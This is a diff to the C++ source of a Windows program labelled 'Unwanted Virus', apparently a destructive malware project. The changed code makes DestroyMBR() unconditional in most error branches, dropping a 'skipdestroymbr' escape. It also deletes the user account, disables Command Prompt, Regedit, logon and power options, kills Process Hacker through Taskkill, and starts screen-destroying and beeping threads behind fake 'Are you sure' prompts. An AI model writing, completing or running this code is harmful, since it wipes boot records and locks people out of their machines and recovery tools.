@@ -16,8 +16,8 @@
 #include <shlwapi.h> // Required for check file existence
 #include <cstdlib> // Required for no "ambiguous"
 #include <stdlib.h> // Same
-#include "data.h" // For Data
-#include "payload.h" // For payloads
+#include <data.h> // For Data
+#include <payload.h> // For payloads
 #include <stdio.h>
 
 
@@ -54,25 +54,14 @@ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmd
 
     int argc;
     LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
-    if (argc > 1) {    
-        if (!lstrcmpW(argv[1], L"testreg")) {
-            testreg();
+    if (argc > 1) {
+        // TEST
+        if (!lstrcmpW(argv[1], L"wts")) {
+            //WriteToString(); 
             return 0;
         }
-        if (!lstrcmpW(argv[1], L"gdi1")) {
-            CreateThread(NULL, NULL, &payloadThread, &DestroyURScreen, NULL, NULL);
-            MessageBox(
-                NULL,
-                (LPCWSTR)L"OK, you missed the fun...",
-                (LPCWSTR)L"Úñåáñþéð ß¾®ü’",
-                MB_ICONINFORMATION | MB_OK
-            );
-            return 0;
-        }
-        if (!lstrcmpW(argv[1], L"fonts")) {
-            Fonts(); // Create Desktop Files
-            return 0;
-        }
+
+        // POS
         if (!lstrcmpW(argv[1], L"createdesktopfiles")) {
             CreateDesktopFiles(); // Create Desktop Files
             return 0;
@@ -211,7 +200,7 @@ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmd
             cout << "Unwanted Virus\n\nCreator: BenjaminFretez\nLanguage: C++\nVersión: 2.0.666.0";
             int startmsg = MessageBox(
                 NULL,
-                (LPCWSTR)L"Unwanted Virus\n\nCreator: BenjaminFretez\nLanguage: C++\nVersión: 3.0.666.0", // about msgbox
+                (LPCWSTR)L"Unwanted Virus\n\nCreator: BenjaminFretez\nLanguage: C++\nVersión: 2.0.666.0", // about msgbox
                 (LPCWSTR)L"About Unwanted Virus",
                 MB_ICONINFORMATION | MB_OK
             );
@@ -233,35 +222,15 @@ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmd
                     int msgboxID = MessageBox(
                         NULL,
                         (LPCWSTR)L"Unknown hard error",
-                        (LPCWSTR)L"Unwanted.exe - System Warning",
+                        (LPCWSTR)L"unwanted.exe - System Warning",
                         MB_ICONWARNING | MB_OK
                     );
                 };
-                int argc;
-                LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
-                if (argc > 1) {
-                    if (!lstrcmpW(argv[1], L"skipdestroymbr")) {
-
-                    }
-                    else
-                    {
-                        DestroyMBR();
-                    }
-                }
-                else
-                {
-                    DestroyMBR();
-                }
+                DestroyMBR();
 
                 CreateThread(NULL, NULL, &payloadThread, &StartBeep, NULL, NULL);
                 CreateThread(NULL, 4096, &STARTripmessages, NULL, NULL, NULL);
-                Sleep(200);
                 CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);
-
-                Sleep(992);
-
-                StartFuckingPC();
-                DisablePowerOptions();
             };
 
             HANDLE ESCAPE = CreateFileA("C:\\The Escape is behind you", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
@@ -421,8 +390,7 @@ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmd
         // Here is the warning seen on the first place
 
         // ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console window (Console heredated, now as Windows Application)
-    warning:
-
+        warning:
         NoUnwanted1();
 
         // In case CMD.EXE is deleted or DisableCMD registry exists
@@ -433,7 +401,7 @@ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmd
                 int startmsg = MessageBox(
                     NULL,
                     (LPCWSTR)L"Are you sure to run this program?", // Warning message box
-                    (LPCWSTR)L"😀😁😎😎🤔😣😱🥵😳😨",
+                    (LPCWSTR)L"Úñåáñþéð ß¾®ü’",
                     MB_ICONWARNING | MB_YESNO
                 );
 
@@ -444,7 +412,7 @@ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmd
                     MessageBox(
                         NULL,
                         (LPCWSTR)L"Sorry, but we cannot found the command interpreter so we cannot continue running this program, press OK to continue", // Warning message box
-                        (LPCWSTR)L"😀😁😎😎🤔😣😱🥵😳😨 - Program Error",
+                        (LPCWSTR)L"Úñåáñþéð ß¾®ü’ - Program Error",
                         MB_ICONERROR | MB_OK
                     );
                     return 1;
@@ -474,7 +442,7 @@ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmd
                 int startmsg = MessageBox(
                     NULL,
                     (LPCWSTR)L"Are you sure to run this program?", // Warning message box
-                    (LPCWSTR)L"😀😁😎😎🤔😣😱🥵😳😨",
+                    (LPCWSTR)L"Úñåáñþéð ß¾®ü’",
                     MB_ICONWARNING | MB_YESNO
                 );
                 // In case you just press yes or no is the same
@@ -493,7 +461,7 @@ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmd
                 int startmsg = MessageBox(
                     NULL,
                     (LPCWSTR)L"Are you sure to run this program?", // Warning message box
-                    (LPCWSTR)L"😀😁😎😎🤔😣😱🥵😳😨",
+                    (LPCWSTR)L"Úñåáñþéð ß¾®ü’",
                     MB_ICONWARNING | MB_YESNO
                 );
 
@@ -505,7 +473,7 @@ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmd
                     int startmsg = MessageBox(
                         NULL,
                         (LPCWSTR)L"OK, you missed the fun...",
-                        (LPCWSTR)L"😀😁😎😎🤔😣😱🥵😳😨",
+                        (LPCWSTR)L"Úñåáñþéð ß¾®ü’",
                         MB_ICONINFORMATION | MB_OK
                     );
                     NoUnwanted0();
@@ -517,10 +485,7 @@ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmd
 
 
 
-    malware:          
-        CreateThread(NULL, 4096, &warningfinalpayload, NULL, NULL, NULL);
-        CreateThread(NULL, NULL, &payloadThread, &beepsandlights, NULL, NULL);
-
+    malware:       
         NoUnwanted1();
         SetTimeDate();
         TestInternetConnection();
@@ -530,23 +495,21 @@ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmd
         Sleep(1000);
         PlaySound(TEXT("C:\\Windows\\Media\\Windows Recycle.wav"), NULL, SND_ASYNC);
         StartFuckingPC(); // Deletes the user then activates other user
-        Fonts();
 
         // Destroy the MBR =)
         if (argc > 1) {
             if (!lstrcmpW(argv[1], L"skipdestroymbr")) {
-
+                goto SkipDestroyMbr;
+                // Do not destroy MBR and continue
             }
             else
             {
-                DestroyMBR();
+                // Still there
             }
         }
-        else
-        {
-            DestroyMBR();
-        }
+        DestroyMBR();
         // Destroys MBR and continue
+        SkipDestroyMbr:
         DisableLogonOptions(); // Disable Logon Options, like Network and ShutDown
         DisablePowerOptions(); // Disable Power Options on LogonUI
         ShellExecuteA(NULL, NULL, "Taskkill", "/f /im ProcessHacker.exe", NULL, SW_HIDE); // Kills Process Hacker in case if it is open
@@ -557,7 +520,6 @@ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmd
         DisableCMD(); // Disable Command Prompt
         DisableRegistryTools(); // Disable Regedit
         Sleep(2000); // Sleep 2 seconds
-        
 
         DownloadFiles:
 
@@ -575,35 +537,15 @@ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmd
                 int msgboxID = MessageBox(
                     NULL,
                     (LPCWSTR)L"Unknown hard error",
-                    (LPCWSTR)L"Unwanted.exe - System Warning",
+                    (LPCWSTR)L"unwanted.exe - System Warning",
                     MB_ICONWARNING | MB_OK
                 );
             };
-            int argc;
-            LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
-            if (argc > 1) {
-                if (!lstrcmpW(argv[1], L"skipdestroymbr")) {
-
-                }
-                else
-                {
-                    DestroyMBR();
-                }
-            }
-            else
-            {
-                DestroyMBR();
-            }
+            DestroyMBR();
 
             CreateThread(NULL, NULL, &payloadThread, &StartBeep, NULL, NULL);
             CreateThread(NULL, 4096, &STARTripmessages, NULL, NULL, NULL);
-            Sleep(200);
             CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);
-
-            Sleep(992);
-
-            StartFuckingPC();
-            DisablePowerOptions();
 
             return -1;
         };
@@ -628,35 +570,15 @@ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmd
                 int msgboxID = MessageBox(
                     NULL,
                     (LPCWSTR)L"Unknown hard error",
-                    (LPCWSTR)L"Unwanted.exe - System Warning",
+                    (LPCWSTR)L"unwanted.exe - System Warning",
                     MB_ICONWARNING | MB_OK
                 );
             };
-            int argc;
-            LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
-            if (argc > 1) {
-                if (!lstrcmpW(argv[1], L"skipdestroymbr")) {
-
-                }
-                else
-                {
-                    DestroyMBR();
-                }
-            }
-            else
-            {
-                DestroyMBR();
-            }
+            DestroyMBR();
 
             CreateThread(NULL, NULL, &payloadThread, &StartBeep, NULL, NULL);
             CreateThread(NULL, 4096, &STARTripmessages, NULL, NULL, NULL);
-            Sleep(200);
             CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);
-
-            Sleep(992);
-
-            StartFuckingPC();
-            DisablePowerOptions();
 
             return -1;
         };
@@ -674,35 +596,15 @@ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmd
                 int msgboxID = MessageBox(
                     NULL,
                     (LPCWSTR)L"Unknown hard error",
-                    (LPCWSTR)L"Unwanted.exe - System Warning",
+                    (LPCWSTR)L"unwanted.exe - System Warning",
                     MB_ICONWARNING | MB_OK
                 );
             };
-            int argc;
-            LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
-            if (argc > 1) {
-                if (!lstrcmpW(argv[1], L"skipdestroymbr")) {
-
-                }
-                else
-                {
-                    DestroyMBR();
-                }
-            }
-            else
-            {
-                DestroyMBR();
-            }
+            DestroyMBR();
 
             CreateThread(NULL, NULL, &payloadThread, &StartBeep, NULL, NULL);
             CreateThread(NULL, 4096, &STARTripmessages, NULL, NULL, NULL);
-            Sleep(200);
             CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);
-
-            Sleep(992);
-
-            StartFuckingPC();
-            DisablePowerOptions();
 
             return -1;
         };
@@ -731,37 +633,15 @@ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmd
                 int msgboxID = MessageBox(
                     NULL,
                     (LPCWSTR)L"Unknown hard error",
-                    (LPCWSTR)L"Unwanted.exe - System Warning",
+                    (LPCWSTR)L"unwanted.exe - System Warning",
                     MB_ICONWARNING | MB_OK
                 );
             };
             DestroyMBR();
 
-            int argc;
-            LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
-            if (argc > 1) {
-                if (!lstrcmpW(argv[1], L"skipdestroymbr")) {
-
-                }
-                else
-                {
-                    DestroyMBR();
-                }
-            }
-            else
-            {
-                DestroyMBR();
-            }
-
             CreateThread(NULL, NULL, &payloadThread, &StartBeep, NULL, NULL);
             CreateThread(NULL, 4096, &STARTripmessages, NULL, NULL, NULL);
-            Sleep(200);
             CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);
-
-            Sleep(992);
-
-            StartFuckingPC();
-            DisablePowerOptions();
 
             return -1;
         };
